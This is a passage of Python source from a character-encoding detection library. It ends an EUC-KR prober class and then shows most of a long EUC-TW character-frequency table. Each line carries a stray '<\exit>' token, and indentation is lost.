self._mDistributionAnalyzer = EUCKRDistributionAnalysis()<\exit>
self.reset()<\exit>
def get_charset_name(self):<\exit>
return "EUC-KR"<\exit>
EUCTW_TYPICAL_DISTRIBUTION_RATIO = 0.75<\exit>
EUCTW_TABLE_SIZE = 8102<\exit>
EUCTWCharToFreqOrder = (<\exit>
1,1800,1506, 255,1431, 198,   9,  82,   6,7310, 177, 202,3615,1256,2808, 110,<\exit>
3735,  33,3241, 261,  76,  44,2113,  16,2931,2184,1176, 659,3868,  26,3404,2643,<\exit>
1198,3869,3313,4060, 410,2211, 302, 590, 361,1963,   8, 204,  58,4296,7311,1931,<\exit>
63,7312,7313, 317,1614,  75, 222, 159,4061,2412,1480,7314,3500,3068, 224,2809,<\exit>
3616,   3,  10,3870,1471,  29,2774,1135,2852,1939, 873, 130,3242,1123, 312,7315,<\exit>
4297,2051, 507, 252, 682,7316, 142,1914, 124, 206,2932,  34,3501,3173,  64, 604,<\exit>
7317,2494,1976,1977, 155,1990, 645, 641,1606,7318,3405, 337,  72, 406,7319,  80,<\exit>
630, 238,3174,1509, 263, 939,1092,2644, 756,1440,1094,3406, 449,  69,2969, 591,<\exit>
179,2095, 471, 115,2034,1843,  60,  50,2970, 134, 806,1868, 734,2035,3407, 180,<\exit>
995,1607, 156, 537,2893, 688,7320, 319,1305, 779,2144, 514,2374, 298,4298, 359,<\exit>
2495,  90,2707,1338, 663,  11, 906,1099,2545,  20,2436, 182, 532,1716,7321, 732,<\exit>
1376,4062,1311,1420,3175,  25,2312,1056, 113, 399, 382,1949, 242,3408,2467, 529,<\exit>
3243, 475,1447,3617,7322, 117,  21, 656, 810,1297,2295,2329,3502,7323, 126,4063,<\exit>
706, 456, 150, 613,4299,  71,1118,2036,4064, 145,3069,  85, 835, 486,2114,1246,<\exit>
1426, 428, 727,1285,1015, 800, 106, 623, 303,1281,7324,2127,2354, 347,3736, 221,<\exit>
3503,3110,7325,1955,1153,4065,  83, 296,1199,3070, 192, 624,  93,7326, 822,1897,<\exit>
2810,3111, 795,2064, 991,1554,1542,1592,  27,  43,2853, 859, 139,1456, 860,4300,<\exit>
437, 712,3871, 164,2392,3112, 695, 211,3017,2096, 195,3872,1608,3504,3505,3618,<\exit>
3873, 234, 811,2971,2097,3874,2229,1441,3506,1615,2375, 668,2076,1638, 305, 228,<\exit>
1664,4301, 467, 415,7327, 262,2098,1593, 239, 108, 300, 200,1033, 512,1247,2077,<\exit>
7328,7329,2173,3176,3619,2673, 593, 845,1062,3244,  88,1723,2037,3875,1950, 212,<\exit>
266, 152, 149, 468,1898,4066,4302,  77, 187,7330,3018,  37,   5,2972,7331,3876,<\exit>
7332,7333,  39,2517,4303,2894,3177,2078,  55, 148,  74,4304, 545, 483,1474,1029,<\exit>
1665, 217,1869,1531,3113,1104,2645,4067,  24, 172,3507, 900,3877,3508,3509,4305,<\exit>
32,1408,2811,1312, 329, 487,2355,2247,2708, 784,2674,   4,3019,3314,1427,1788,<\exit>
188, 109, 499,7334,3620,1717,1789, 888,1217,3020,4306,7335,3510,7336,3315,1520,<\exit>
3621,3878, 196,1034, 775,7337,7338, 929,1815, 249, 439,  38,7339,1063,7340, 794,<\exit>
3879,1435,2296,  46, 178,3245,2065,7341,2376,7342, 214,1709,4307, 804,  35, 707,<\exit>
324,3622,1601,2546, 140, 459,4068,7343,7344,1365, 839, 272, 978,2257,2572,3409,<\exit>
2128,1363,3623,1423, 697, 100,3071,  48,  70,1231, 495,3114,2193,7345,1294,7346,<\exit>
2079, 462, 586,1042,3246, 853, 256, 988, 185,2377,3410,1698, 434,1084,7347,3411,<\exit>
314,2615,2775,4308,2330,2331, 569,2280, 637,1816,2518, 757,1162,1878,1616,3412,<\exit>
287,1577,2115, 768,4309,1671,2854,3511,2519,1321,3737, 909,2413,7348,4069, 933,<\exit>
3738,7349,2052,2356,1222,4310, 765,2414,1322, 786,4311,7350,1919,1462,1677,2895,<\exit>
1699,7351,4312,1424,2437,3115,3624,2590,3316,1774,1940,3413,3880,4070, 309,1369,<\exit>
1130,2812, 364,2230,1653,1299,3881,3512,3882,3883,2646, 525,1085,3021, 902,2000,<\exit>
1475, 964,4313, 421,1844,1415,1057,2281, 940,1364,3116, 376,4314,4315,1381,   7,<\exit>
2520, 983,2378, 336,1710,2675,1845, 321,3414, 559,1131,3022,2742,1808,1132,1313,<\exit>
265,1481,1857,7352, 352,1203,2813,3247, 167,1089, 420,2814, 776, 792,1724,3513,<\exit>
4071,2438,3248,7353,4072,7354, 446, 229, 333,2743, 901,3739,1200,1557,4316,2647,<\exit>
1920, 395,2744,2676,3740,4073,1835, 125, 916,3178,2616,4317,7355,7356,3741,7357,<\exit>
7358,7359,4318,3117,3625,1133,2547,1757,3415,1510,2313,1409,3514,7360,2145, 438,<\exit>
2591,2896,2379,3317,1068, 958,3023, 461, 311,2855,2677,4074,1915,3179,4075,1978,<\exit>
383, 750,2745,2617,4076, 274, 539, 385,1278,1442,7361,1154,1964, 384, 561, 210,<\exit>
98,1295,2548,3515,7362,1711,2415,1482,3416,3884,2897,1257, 129,7363,3742, 642,<\exit>
523,2776,2777,2648,7364, 141,2231,1333,  68, 176, 441, 876, 907,4077, 603,2592,<\exit>
710, 171,3417, 404, 549,  18,3118,2393,1410,3626,1666,7365,3516,4319,2898,4320,<\exit>
7366,2973, 368,7367, 146, 366,  99, 871,3627,1543, 748, 807,1586,1185,  22,2258,<\exit>
379,3743,3180,7368,3181, 505,1941,2618,1991,1382,2314,7369, 380,2357, 218, 702,<\exit>
1817,1248,3418,3024,3517,3318,3249,7370,2974,3628, 930,3250,3744,7371,  59,7372,<\exit>
585, 601,4078, 497,3419,1112,1314,4321,1801,7373,1223,1472,2174,7374, 749,1836,<\exit>
690,1899,3745,1772,3885,1476, 429,1043,1790,2232,2116, 917,4079, 447,1086,1629,<\exit>
7375, 556,7376,7377,2020,1654, 844,1090, 105, 550, 966,1758,2815,1008,1782, 686,<\exit>
1095,7378,2282, 793,1602,7379,3518,2593,4322,4080,2933,2297,4323,3746, 980,2496,<\exit>
544, 353, 527,4324, 908,2678,2899,7380, 381,2619,1942,1348,7381,1341,1252, 560,<\exit>
3072,7382,3420,2856,7383,2053, 973, 886,2080, 143,4325,7384,7385, 157,3886, 496,<\exit>
4081,  57, 840, 540,2038,4326,4327,3421,2117,1445, 970,2259,1748,1965,2081,4082,<\exit>
3119,1234,1775,3251,2816,3629, 773,1206,2129,1066,2039,1326,3887,1738,1725,4083,<\exit>
279,3120,  51,1544,2594, 423,1578,2130,2066, 173,4328,1879,7386,7387,1583, 264,<\exit>
610,3630,4329,2439, 280, 154,7388,7389,7390,1739, 338,1282,3073, 693,2857,1411,<\exit>
1074,3747,2440,7391,4330,7392,7393,1240, 952,2394,7394,2900,1538,2679, 685,1483,<\exit>
4084,2468,1436, 953,4085,2054,4331, 671,2395,  79,4086,2441,3252, 608, 567,2680,<\exit>
3422,4087,4088,1691, 393,1261,1791,2396,7395,4332,7396,7397,7398,7399,1383,1672,<\exit>
3748,3182,1464, 522,1119, 661,1150, 216, 675,4333,3888,1432,3519, 609,4334,2681,<\exit>
2397,7400,7401,7402,4089,3025,   0,7403,2469, 315, 231,2442, 301,3319,4335,2380,<\exit>
7404, 233,4090,3631,1818,4336,4337,7405,  96,1776,1315,2082,7406, 257,7407,1809,<\exit>
3632,2709,1139,1819,4091,2021,1124,2163,2778,1777,2649,7408,3074, 363,1655,3183,<\exit>
7409,2975,7410,7411,7412,3889,1567,3890, 718, 103,3184, 849,1443, 341,3320,2934,<\exit>
1484,7413,1712, 127,  67, 339,4092,2398, 679,1412, 821,7414,7415, 834, 738, 351,<\exit>
2976,2146, 846, 235,1497,1880, 418,1992,3749,2710, 186,1100,2147,2746,3520,1545,<\exit>
1355,2935,2858,1377, 583,3891,4093,2573,2977,7416,1298,3633,1078,2549,3634,2358,<\exit>
78,3750,3751, 267,1289,2099,2001,1594,4094, 348, 369,1274,2194,2175,1837,4338,<\exit>
1820,2817,3635,2747,2283,2002,4339,2936,2748, 144,3321, 882,4340,3892,2749,3423,<\exit>
4341,2901,7417,4095,1726, 320,7418,3893,3026, 788,2978,7419,2818,1773,1327,2859,<\exit>
3894,2819,7420,1306,4342,2003,1700,3752,3521,2359,2650, 787,2022, 506, 824,3636,<\exit>
534, 323,4343,1044,3322,2023,1900, 946,3424,7421,1778,1500,1678,7422,1881,4344,<\exit>
165, 243,4345,3637,2521, 123, 683,4096, 764,4346,  36,3895,1792, 589,2902, 816,<\exit>
626,1667,3027,2233,1639,1555,1622,3753,3896,7423,3897,2860,1370,1228,1932, 891,<\exit>
2083,2903, 304,4097,7424, 292,2979,2711,3522, 691,2100,4098,1115,4347, 118, 662,<\exit>
7425, 611,1156, 854,2381,1316,2861,   2, 386, 515,2904,7426,7427,3253, 868,2234,<\exit>
1486, 855,2651, 785,2212,3028,7428,1040,3185,3523,7429,3121, 448,7430,1525,7431,<\exit>
2164,4348,7432,3754,7433,4099,2820,3524,3122, 503, 818,3898,3123,1568, 814, 676,<\exit>
1444, 306,1749,7434,3755,1416,1030, 197,1428, 805,2821,1501,4349,7435,7436,7437,<\exit>
1993,7438,4350,7439,7440,2195,  13,2779,3638,2980,3124,1229,1916,7441,3756,2131,<\exit>
7442,4100,4351,2399,3525,7443,2213,1511,1727,1120,7444,7445, 646,3757,2443, 307,<\exit>
7446,7447,1595,3186,7448,7449,7450,3639,1113,1356,3899,1465,2522,2523,7451, 519,<\exit>
7452, 128,2132,  92,2284,1979,7453,3900,1512, 342,3125,2196,7454,2780,2214,1980,<\exit>
3323,7455, 290,1656,1317, 789, 827,2360,7456,3758,4352, 562, 581,3901,7457, 401,<\exit>
4353,2248,  94,4354,1399,2781,7458,1463,2024,4355,3187,1943,7459, 828,1105,4101,<\exit>
1262,1394,7460,4102, 605,4356,7461,1783,2862,7462,2822, 819,2101, 578,2197,2937,<\exit>
7463,1502, 436,3254,4103,3255,2823,3902,2905,3425,3426,7464,2712,2315,7465,7466,<\exit>
2332,2067,  23,4357, 193, 826,3759,2102, 699,1630,4104,3075, 390,1793,1064,3526,<\exit>
7467,1579,3076,3077,1400,7468,4105,1838,1640,2863,7469,4358,4359, 137,4106, 598,<\exit>
3078,1966, 780, 104, 974,2938,7470, 278, 899, 253, 402, 572, 504, 493,1339,7471,<\exit>
3903,1275,4360,2574,2550,7472,3640,3029,3079,2249, 565,1334,2713, 863,  41,7473,<\exit>
7474,4361,7475,1657,2333,  19, 463,2750,4107, 606,7476,2981,3256,1087,2084,1323,<\exit>
2652,2982,7477,1631,1623,1750,4108,2682,7478,2864, 791,2714,2653,2334, 232,2416,<\exit>
7479,2983,1498,7480,2654,2620, 755,1366,3641,3257,3126,2025,1609, 119,1917,3427,<\exit>
862,1026,4109,7481,3904,3760,4362,3905,4363,2260,1951,2470,7482,1125, 817,4110,<\exit>
4111,3906,1513,1766,2040,1487,4112,3030,3258,2824,3761,3127,7483,7484,1507,7485,<\exit>
2683, 733,  40,1632,1106,2865, 345,4113, 841,2524, 230,4364,2984,1846,3259,3428,<\exit>
7486,1263, 986,3429,7487, 735, 879, 254,1137, 857, 622,1300,1180,1388,1562,3907,<\exit>
3908,2939, 967,2751,2655,1349, 592,2133,1692,3324,2985,1994,4114,1679,3909,1901,<\exit>
2185,7488, 739,3642,2715,1296,1290,7489,4115,2198,2199,1921,1563,2595,2551,1870,<\exit>
2752,2986,7490, 435,7491, 343,1108, 596,  17,1751,4365,2235,3430,3643,7492,4366,<\exit>
294,3527,2940,1693, 477, 979, 281,2041,3528, 643,2042,3644,2621,2782,2261,1031,<\exit>
2335,2134,2298,3529,4367, 367,1249,2552,7493,3530,7494,4368,1283,3325,2004, 240,<\exit>
1762,3326,4369,4370, 836,1069,3128, 474,7495,2148,2525, 268,3531,7496,3188,1521,<\exit>
1284,7497,1658,1546,4116,7498,3532,3533,7499,4117,3327,2684,1685,4118, 961,1673,<\exit>
2622, 190,2005,2200,3762,4371,4372,7500, 570,2497,3645,1490,7501,4373,2623,3260,<\exit>
1956,4374, 584,1514, 396,1045,1944,7502,4375,1967,2444,7503,7504,4376,3910, 619,<\exit>
7505,3129,3261, 215,2006,2783,2553,3189,4377,3190,4378, 763,4119,3763,4379,7506,<\exit>
7507,1957,1767,2941,3328,3646,1174, 452,1477,4380,3329,3130,7508,2825,1253,2382,<\exit>
2186,1091,2285,4120, 492,7509, 638,1169,1824,2135,1752,3911, 648, 926,1021,1324,<\exit>
4381, 520,4382, 997, 847,1007, 892,4383,3764,2262,1871,3647,7510,2400,1784,4384,<\exit>
1952,2942,3080,3191,1728,4121,2043,3648,4385,2007,1701,3131,1551,  30,2263,4122,<\exit>
7511,2026,4386,3534,7512, 501,7513,4123, 594,3431,2165,1821,3535,3432,3536,3192,<\exit>
829,2826,4124,7514,1680,3132,1225,4125,7515,3262,4387,4126,3133,2336,7516,4388,<\exit>
4127,7517,3912,3913,7518,1847,2383,2596,3330,7519,4389, 374,3914, 652,4128,4129,<\exit>
375,1140, 798,7520,7521,7522,2361,4390,2264, 546,1659, 138,3031,2445,4391,7523,<\exit>
2250, 612,1848, 910, 796,3765,1740,1371, 825,3766,3767,7524,2906,2554,7525, 692,<\exit>
444,3032,2624, 801,4392,4130,7526,1491, 244,1053,3033,4131,4132, 340,7527,3915,<\exit>
1041,2987, 293,1168,  87,1357,7528,1539, 959,7529,2236, 721, 694,4133,3768, 219,<\exit>
1478, 644,1417,3331,2656,1413,1401,1335,1389,3916,7530,7531,2988,2362,3134,1825,<\exit>
730,1515, 184,2827,  66,4393,7532,1660,2943, 246,3332, 378,1457, 226,3433, 975,<\exit>
3917,2944,1264,3537, 674, 696,7533, 163,7534,1141,2417,2166, 713,3538,3333,4394,<\exit>
3918,7535,7536,1186,  15,7537,1079,1070,7538,1522,3193,3539, 276,1050,2716, 758,<\exit>
1126, 653,2945,3263,7539,2337, 889,3540,3919,3081,2989, 903,1250,4395,3920,3434,<\exit>
3541,1342,1681,1718, 766,3264, 286,  89,2946,3649,7540,1713,7541,2597,3334,2990,<\exit>
7542,2947,2215,3194,2866,7543,4396,2498,2526, 181, 387,1075,3921, 731,2187,3335,<\exit>
7544,3265, 310, 313,3435,2299, 770,4134,  54,3034, 189,4397,3082,3769,3922,7545,<\exit>
1230,1617,1849, 355,3542,4135,4398,3336, 111,4136,3650,1350,3135,3436,3035,4137,<\exit>
2149,3266,3543,7546,2784,3923,3924,2991, 722,2008,7547,1071, 247,1207,2338,2471,<\exit>
1378,4399,2009, 864,1437,1214,4400, 373,3770,1142,2216, 667,4401, 442,2753,2555,<\exit>
3771,3925,1968,4138,3267,1839, 837, 170,1107, 934,1336,1882,7548,7549,2118,4139,<\exit>
2828, 743,1569,7550,4402,4140, 582,2384,1418,3437,7551,1802,7552, 357,1395,1729,<\exit>
3651,3268,2418,1564,2237,7553,3083,3772,1633,4403,1114,2085,4141,1532,7554, 482,<\exit>
2446,4404,7555,7556,1492, 833,1466,7557,2717,3544,1641,2829,7558,1526,1272,3652,<\exit>
4142,1686,1794, 416,2556,1902,1953,1803,7559,3773,2785,3774,1159,2316,7560,2867,<\exit>
4405,1610,1584,3036,2419,2754, 443,3269,1163,3136,7561,7562,3926,7563,4143,2499,<\exit>
3037,4406,3927,3137,2103,1647,3545,2010,1872,4144,7564,4145, 431,3438,7565, 250,<\exit>
97,  81,4146,7566,1648,1850,1558, 160, 848,7567, 866, 740,1694,7568,2201,2830,<\exit>
3195,4147,4407,3653,1687, 950,2472, 426, 469,3196,3654,3655,3928,7569,7570,1188,<\exit>
424,1995, 861,3546,4148,3775,2202,2685, 168,1235,3547,4149,7571,2086,1674,4408,<\exit>
3337,3270, 220,2557,1009,7572,3776, 670,2992, 332,1208, 717,7573,7574,3548,2447,<\exit>
3929,3338,7575, 513,7576,1209,2868,3339,3138,4409,1080,7577,7578,7579,7580,2527,<\exit>
3656,3549, 815,1587,3930,3931,7581,3550,3439,3777,1254,4410,1328,3038,1390,3932,<\exit>
1741,3933,3778,3934,7582, 236,3779,2448,3271,7583,7584,3657,3780,1273,3781,4411,<\exit>
7585, 308,7586,4412, 245,4413,1851,2473,1307,2575, 430, 715,2136,2449,7587, 270,<\exit>
199,2869,3935,7588,3551,2718,1753, 761,1754, 725,1661,1840,4414,3440,3658,7589,<\exit>
7590, 587,  14,3272, 227,2598, 326, 480,2265, 943,2755,3552, 291, 650,1883,7591,<\exit>
1702,1226, 102,1547,  62,3441, 904,4415,3442,1164,4150,7592,7593,1224,1548,2756,<\exit>
391, 498,1493,7594,1386,1419,7595,2055,1177,4416, 813, 880,1081,2363, 566,1145,<\exit>
4417,2286,1001,1035,2558,2599,2238, 394,1286,7596,7597,2068,7598,  86,1494,1730,<\exit>
3936, 491,1588, 745, 897,2948, 843,3340,3937,2757,2870,3273,1768, 998,2217,2069,<\exit>
397,1826,1195,1969,3659,2993,3341, 284,7599,3782,2500,2137,2119,1903,7600,3938,<\exit>
2150,3939,4151,1036,3443,1904, 114,2559,4152, 209,1527,7601,7602,2949,2831,2625,<\exit>
2385,2719,3139, 812,2560,7603,3274,7604,1559, 737,1884,3660,1210, 885,  28,2686,<\exit>
3553,3783,7605,4153,1004,1779,4418,7606, 346,1981,2218,2687,4419,3784,1742, 797,<\exit>
1642,3940,1933,1072,1384,2151, 896,3941,3275,3661,3197,2871,3554,7607,2561,1958,<\exit>
4420,2450,1785,7608,7609,7610,3942,4154,1005,1308,3662,4155,2720,4421,4422,1528,<\exit>
2600, 161,1178,4156,1982, 987,4423,1101,4157, 631,3943,1157,3198,2420,1343,1241,<\exit>
1016,2239,2562, 372, 877,2339,2501,1160, 555,1934, 911,3944,7611, 466,1170, 169,<\exit>
1051,2907,2688,3663,2474,2994,1182,2011,2563,1251,2626,7612, 992,2340,3444,1540,<\exit>
2721,1201,2070,2401,1996,2475,7613,4424, 528,1922,2188,1503,1873,1570,2364,3342,<\exit>
3276,7614, 557,1073,7615,1827,3445,2087,2266,3140,3039,3084, 767,3085,2786,4425,<\exit>
1006,4158,4426,2341,1267,2176,3664,3199, 778,3945,3200,2722,1597,2657,7616,4427,<\exit>
7617,3446,7618,7619,7620,3277,2689,1433,3278, 131,  95,1504,3946, 723,4159,3141,<\exit>
1841,3555,2758,2189,3947,2027,2104,3665,7621,2995,3948,1218,7622,3343,3201,3949,<\exit>
4160,2576, 248,1634,3785, 912,7623,2832,3666,3040,3786, 654,  53,7624,2996,7625,<\exit>
1688,4428, 777,3447,1032,3950,1425,7626, 191, 820,2120,2833, 971,4429, 931,3202,<\exit>
135, 664, 783,3787,1997, 772,2908,1935,3951,3788,4430,2909,3203, 282,2723, 640,<\exit>
1372,3448,1127, 922, 325,3344,7627,7628, 711,2044,7629,7630,3952,2219,2787,1936,<\exit>
3953,3345,2220,2251,3789,2300,7631,4431,3790,1258,3279,3954,3204,2138,2950,3955,<\exit>
3956,7632,2221, 258,3205,4432, 101,1227,7633,3280,1755,7634,1391,3281,7635,2910,<\exit>
2056, 893,7636,7637,7638,1402,4161,2342,7639,7640,3206,3556,7641,7642, 878,1325,<\exit>
1780,2788,4433, 259,1385,2577, 744,1183,2267,4434,7643,3957,2502,7644, 684,1024,<\exit>
4162,7645, 472,3557,3449,1165,3282,3958,3959, 322,2152, 881, 455,1695,1152,1340,<\exit>
660, 554,2153,4435,1058,4436,4163, 830,1065,3346,3960,4437,1923,7646,1703,1918,<\exit>
7647, 932,2268, 122,7648,4438, 947, 677,7649,3791,2627, 297,1905,1924,2269,4439,<\exit>
2317,3283,7650,7651,4164,7652,4165,  84,4166, 112, 989,7653, 547,1059,3961, 701,<\exit>
3558,1019,7654,4167,7655,3450, 942, 639, 457,2301,2451, 993,2951, 407, 851, 494,<\exit>
4440,3347, 927,7656,1237,7657,2421,3348, 573,4168, 680, 921,2911,1279,1874, 285,<\exit>
790,1448,1983, 719,2167,7658,7659,4441,3962,3963,1649,7660,1541, 563,7661,1077,<\exit>
7662,3349,3041,3451, 511,2997,3964,3965,3667,3966,1268,2564,3350,3207,4442,4443,<\exit>
7663, 535,1048,1276,1189,2912,2028,3142,1438,1373,2834,2952,1134,2012,7664,4169,<\exit>
1238,2578,3086,1259,7665, 700,7666,2953,3143,3668,4170,7667,4171,1146,1875,1906,<\exit>
4444,2601,3967, 781,2422, 132,1589, 203, 147, 273,2789,2402, 898,1786,2154,3968,<\exit>
3969,7668,3792,2790,7669,7670,4445,4446,7671,3208,7672,1635,3793, 965,7673,1804,<\exit>
2690,1516,3559,1121,1082,1329,3284,3970,1449,3794,  65,1128,2835,2913,2759,1590,<\exit>
3795,7674,7675,  12,2658,  45, 976,2579,3144,4447, 517,2528,1013,1037,3209,7676,<\exit>
3796,2836,7677,3797,7678,3452,7679,2602, 614,1998,2318,3798,3087,2724,2628,7680,<\exit>
2580,4172, 599,1269,7681,1810,3669,7682,2691,3088, 759,1060, 489,1805,3351,3285,<\exit>
1358,7683,7684,2386,1387,1215,2629,2252, 490,7685,7686,4173,1759,2387,2343,7687,<\exit>
4448,3799,1907,3971,2630,1806,3210,4449,3453,3286,2760,2344, 874,7688,7689,3454,<\exit>
3670,1858,  91,2914,3671,3042,3800,4450,7690,3145,3972,2659,7691,3455,1202,1403,<\exit>
3801,2954,2529,1517,2503,4451,3456,2504,7692,4452,7693,2692,1885,1495,1731,3973,<\exit>
2365,4453,7694,2029,7695,7696,3974,2693,1216, 237,2581,4174,2319,3975,3802,4454,<\exit>
4455,2694,3560,3457, 445,4456,7697,7698,7699,7700,2761,  61,3976,3672,1822,3977,<\exit>
7701, 687,2045, 935, 925, 405,2660, 703,1096,1859,2725,4457,3978,1876,1367,2695,<\exit>
3352, 918,2105,1781,2476, 334,3287,1611,1093,4458, 564,3146,3458,3673,3353, 945,<\exit>
2631,2057,4459,7702,1925, 872,4175,7703,3459,2696,3089, 349,4176,3674,3979,4460,<\exit>
3803,4177,3675,2155,3980,4461,4462,4178,4463,2403,2046, 782,3981, 400, 251,4179,<\exit>
1624,7704,7705, 277,3676, 299,1265, 476,1191,3804,2121,4180,4181,1109, 205,7706,<\exit>
2582,1000,2156,3561,1860,7707,7708,7709,4464,7710,4465,2565, 107,2477,2157,3982,<\exit>
3460,3147,7711,1533, 541,1301, 158, 753,4182,2872,3562,7712,1696, 370,1088,4183,<\exit>
4466,3563, 579, 327, 440, 162,2240, 269,1937,1374,3461, 968,3043,  56,1396,3090,<\exit>
2106,3288,3354,7713,1926,2158,4467,2998,7714,3564,7715,7716,3677,4468,2478,7717,<\exit>
2791,7718,1650,4469,7719,2603,7720,7721,3983,2661,3355,1149,3356,3984,3805,3985,<\exit>
7722,1076,  49,7723, 951,3211,3289,3290, 450,2837, 920,7724,1811,2792,2366,4184,<\exit>
1908,1138,2367,3806,3462,7725,3212,4470,1909,1147,1518,2423,4471,3807,7726,4472,<\exit>
2388,2604, 260,1795,3213,7727,7728,3808,3291, 708,7729,3565,1704,7730,3566,1351,<\exit>
1618,3357,2999,1886, 944,4185,3358,4186,3044,3359,4187,7731,3678, 422, 413,1714,<\exit>
3292, 500,2058,2345,4188,2479,7732,1344,1910, 954,7733,1668,7734,7735,3986,2404,<\exit>
4189,3567,3809,4190,7736,2302,1318,2505,3091, 133,3092,2873,4473, 629,  31,2838,<\exit>
2697,3810,4474, 850, 949,4475,3987,2955,1732,2088,4191,1496,1852,7737,3988, 620,<\exit>
3214, 981,1242,3679,3360,1619,3680,1643,3293,2139,2452,1970,1719,3463,2168,7738,<\exit>
3215,7739,7740,3361,1828,7741,1277,4476,1565,2047,7742,1636,3568,3093,7743, 869,<\exit>
2839, 655,3811,3812,3094,3989,3000,3813,1310,3569,4477,7744,7745,7746,1733, 558,<\exit>
4478,3681, 335,1549,3045,1756,4192,3682,1945,3464,1829,1291,1192, 470,2726,2107,<\exit>
2793, 913,1054,3990,7747,1027,7748,3046,3991,4479, 982,2662,3362,3148,3465,3216,<\exit>
3217,1946,2794,7749, 571,4480,7750,1830,7751,3570,2583,1523,2424,7752,2089, 984,<\exit>
4481,3683,1959,7753,3684, 852, 923,2795,3466,3685, 969,1519, 999,2048,2320,1705,<\exit>
7754,3095, 615,1662, 151, 597,3992,2405,2321,1049, 275,4482,3686,4193, 568,3687,<\exit>
3571,2480,4194,3688,7755,2425,2270, 409,3218,7756,1566,2874,3467,1002, 769,2840,<\exit>
194,2090,3149,3689,2222,3294,4195, 628,1505,7757,7758,1763,2177,3001,3993, 521,<\exit>
1161,2584,1787,2203,2406,4483,3994,1625,4196,4197, 412,  42,3096, 464,7759,2632,<\exit>
4484,3363,1760,1571,2875,3468,2530,1219,2204,3814,2633,2140,2368,4485,4486,3295,<\exit>
1651,3364,3572,7760,7761,3573,2481,3469,7762,3690,7763,7764,2271,2091, 460,7765,<\exit>
4487,7766,3002, 962, 588,3574, 289,3219,2634,1116,  52,7767,3047,1796,7768,7769,<\exit>
7770,1467,7771,1598,1143,3691,4198,1984,1734,1067,4488,1280,3365, 465,4489,1572,<\exit>
510,7772,1927,2241,1812,1644,3575,7773,4490,3692,7774,7775,2663,1573,1534,7776,<\exit>
7777,4199, 536,1807,1761,3470,3815,3150,2635,7778,7779,7780,4491,3471,2915,1911,<\exit>
2796,7781,3296,1122, 377,3220,7782, 360,7783,7784,4200,1529, 551,7785,2059,3693,<\exit>
1769,2426,7786,2916,4201,3297,3097,2322,2108,2030,4492,1404, 136,1468,1479, 672,<\exit>
1171,3221,2303, 271,3151,7787,2762,7788,2049, 678,2727, 865,1947,4493,7789,2013,<\exit>
3995,2956,7790,2728,2223,1397,3048,3694,4494,4495,1735,2917,3366,3576,7791,3816,<\exit>
509,2841,2453,2876,3817,7792,7793,3152,3153,4496,4202,2531,4497,2304,1166,1010,<\exit>
552, 681,1887,7794,7795,2957,2958,3996,1287,1596,1861,3154, 358, 453, 736, 175,<\exit>
478,1117, 905,1167,1097,7796,1853,1530,7797,1706,7798,2178,3472,2287,3695,3473,<\exit>
3577,4203,2092,4204,7799,3367,1193,2482,4205,1458,2190,2205,1862,1888,1421,3298,<\exit>
2918,3049,2179,3474, 595,2122,7800,3997,7801,7802,4206,1707,2636, 223,3696,1359,<\exit>
751,3098, 183,3475,7803,2797,3003, 419,2369, 633, 704,3818,2389, 241,7804,7805,<\exit>
7806, 838,3004,3697,2272,2763,2454,3819,1938,2050,3998,1309,3099,2242,1181,7807,<\exit>
1136,2206,3820,2370,1446,4207,2305,4498,7808,7809,4208,1055,2605, 484,3698,7810,<\exit>
3999, 625,4209,2273,3368,1499,4210,4000,7811,4001,4211,3222,2274,2275,3476,7812,<\exit>
7813,2764, 808,2606,3699,3369,4002,4212,3100,2532, 526,3370,3821,4213, 955,7814,<\exit>
1620,4214,2637,2427,7815,1429,3700,1669,1831, 994, 928,7816,3578,1260,7817,7818,<\exit>
7819,1948,2288, 741,2919,1626,4215,2729,2455, 867,1184, 362,3371,1392,7820,7821,<\exit>
4003,4216,1770,1736,3223,2920,4499,4500,1928,2698,1459,1158,7822,3050,3372,2877,<\exit>
1292,1929,2506,2842,3701,1985,1187,2071,2014,2607,4217,7823,2566,2507,2169,3702,<\exit>
2483,3299,7824,3703,4501,7825,7826, 666,1003,3005,1022,3579,4218,7827,4502,1813,<\exit>
2253, 574,3822,1603, 295,1535, 705,3823,4219, 283, 858, 417,7828,7829,3224,4503,<\exit>
4504,3051,1220,1889,1046,2276,2456,4004,1393,1599, 689,2567, 388,4220,7830,2484,<\exit>
802,7831,2798,3824,2060,1405,2254,7832,4505,3825,2109,1052,1345,3225,1585,7833,<\exit>
809,7834,7835,7836, 575,2730,3477, 956,1552,1469,1144,2323,7837,2324,1560,2457,<\exit>
3580,3226,4005, 616,2207,3155,2180,2289,7838,1832,7839,3478,4506,7840,1319,3704,<\exit>
3705,1211,3581,1023,3227,1293,2799,7841,7842,7843,3826, 607,2306,3827, 762,2878,<\exit>
1439,4221,1360,7844,1485,3052,7845,4507,1038,4222,1450,2061,2638,4223,1379,4508,<\exit>
2585,7846,7847,4224,1352,1414,2325,2921,1172,7848,7849,3828,3829,7850,1797,1451,<\exit>
7851,7852,7853,7854,2922,4006,4007,2485,2346, 411,4008,4009,3582,3300,3101,4509,<\exit>
1561,2664,1452,4010,1375,7855,7856,  47,2959, 316,7857,1406,1591,2923,3156,7858,<\exit>
1025,2141,3102,3157, 354,2731, 884,2224,4225,2407, 508,3706, 726,3583, 996,2428,<\exit>
3584, 729,7859, 392,2191,1453,4011,4510,3707,7860,7861,2458,3585,2608,1675,2800,<\exit>
919,2347,2960,2348,1270,4511,4012,  73,7862,7863, 647,7864,3228,2843,2255,1550,<\exit>
1346,3006,7865,1332, 883,3479,7866,7867,7868,7869,3301,2765,7870,1212, 831,1347,<\exit>
4226,4512,2326,3830,1863,3053, 720,3831,4513,4514,3832,7871,4227,7872,7873,4515,<\exit>
7874,7875,1798,4516,3708,2609,4517,3586,1645,2371,7876,7877,2924, 669,2208,2665,<\exit>
2429,7878,2879,7879,7880,1028,3229,7881,4228,2408,7882,2256,1353,7883,7884,4518,<\exit>
3158, 518,7885,4013,7886,4229,1960,7887,2142,4230,7888,7889,3007,2349,2350,3833,<\exit>
516,1833,1454,4014,2699,4231,4519,2225,2610,1971,1129,3587,7890,2766,7891,2961,<\exit>
1422, 577,1470,3008,1524,3373,7892,7893, 432,4232,3054,3480,7894,2586,1455,2508,<\exit>
2226,1972,1175,7895,1020,2732,4015,3481,4520,7896,2733,7897,1743,1361,3055,3482,<\exit>
2639,4016,4233,4521,2290, 895, 924,4234,2170, 331,2243,3056, 166,1627,3057,1098,<\exit>
7898,1232,2880,2227,3374,4522, 657, 403,1196,2372, 542,3709,3375,1600,4235,3483,<\exit>
